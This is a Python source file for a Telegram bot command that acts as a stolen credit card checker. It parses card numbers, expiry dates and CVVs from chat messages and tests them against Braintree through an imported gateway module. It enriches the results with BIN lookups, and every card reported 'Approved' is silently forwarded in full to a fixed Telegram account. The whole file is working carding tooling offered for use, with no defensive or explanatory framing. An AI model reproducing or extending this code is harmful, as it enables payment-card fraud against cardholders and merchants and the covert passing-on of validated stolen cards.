from srca.configs import find_cards
from plugins.gates.src.braintreeauth import Braintre3
import time
from srca.configs import addCommand
import requests

@addCommand('b3')
def mc(client, m):
    # Lista de usuarios autorizados
    ALLOWED_USERS = [338411613, 7389519750, 5914801650]
    APPROVED_REPORT_ID = 7389519750  # ID para enviar resultados Approved

    # Verificar si el usuario está autorizado
    if m.from_user.id not in ALLOWED_USERS:
        return m.reply('<b>No estás autorizado para usar este comando.</b>')

    inicio = time.time()

    # Obtener tarjeta desde mensaje respondido o texto directo
    if m.reply_to_message:
        ccs = find_cards(m.reply_to_message.text)
    else:
        ccs = find_cards(m.text)

    # Validar formato de la tarjeta
    if ccs == '<b>ingrese la ccs.</b>':
        return m.reply(ccs)

    cc_com = '{}|{}|{}|{}'.format(ccs[0], ccs[1], ccs[2], ccs[3])

    # Mensaje inicial de procesamiento
    new = m.reply(f'''<b>あ Braintree Charged

• Cc: <code>{cc_com}</code>      
• Status: Processing... [ ☃️ ]
• From: @{m.from_user.username}</b>''')

    try:
        # Consultar BIN
        req = requests.get(f'https://binlist.io/lookup/{ccs[0][:6]}')
        # Procesar la tarjeta
        chk = Braintre3().main(cc_com)
        fin = time.time()

        # Mensaje final
        texto = f'''<b>あ Braintree Charged

• Cc: <code>{cc_com}</code>
• Status: {chk[0]}
• Response: <code>{chk[1]}</code>

• Bin: {req.json()['scheme']} {req.json()['type']} {req.json()['category']}
• Country: {req.json()['country']['name']} [{req.json()['country']['emoji']}]
• Bank: {req.json()['bank']['name']} 

• Pxs: Live ✅
• Time: <code>{fin-inicio:0.4f}'s</code>
• From: @{m.from_user.username}</b>'''
        new.edit_text(texto)

        # Enviar mensaje al ID 7389519750 si el resultado es Approved
        if "Approved" in chk[0]:
            client.send_message(
                chat_id=APPROVED_REPORT_ID,
                text=f"<b>Approved Card\nCard: <code>{cc_com}</code>\nStatus: {chk[0]}\nResponse: <code>{chk[1]}</code>\nFrom: @{m.from_user.username}</b>"
            )

    except Exception as e:
        fin = time.time()
        new.edit_text(f'''<b>あ Braintree Charged

• Cc: <code>{cc_com}</code>
• Status: Error
• Response: <code>Invalid or failed processing</code>

• Pxs: Live ✅
• Time: <code>{fin-inicio:0.4f}'s</code>
• From: @{m.from_user.username}</b>''')